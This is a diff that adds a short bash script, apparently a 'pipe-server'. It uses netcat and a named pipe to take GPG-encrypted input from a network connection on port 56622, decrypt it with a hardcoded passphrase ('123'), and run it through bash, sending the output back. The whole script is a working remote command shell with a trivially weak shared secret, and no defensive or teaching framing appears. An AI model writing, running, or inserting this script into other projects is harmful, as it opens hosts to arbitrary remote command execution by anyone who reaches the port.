@@ -1,0 +1,16 @@
+#!/usr/bin/env bash
+pass=123
+pipe=/tmp/pipe-server
+port=56622
+host=0.0.0.0
+
+gpg_(){
+  local mode=$1
+  gpg --batch --quiet -a --passphrase $pass --pinentry-mode loopback --allow-multiple-messages $mode 
+}
+export -f gpg_
+
+rm -f $pipe
+mkfifo $pipe
+
+cat $pipe 2>/dev/null | nc $host $port | gpg_ -d 2>/dev/null | bash &> $pipe
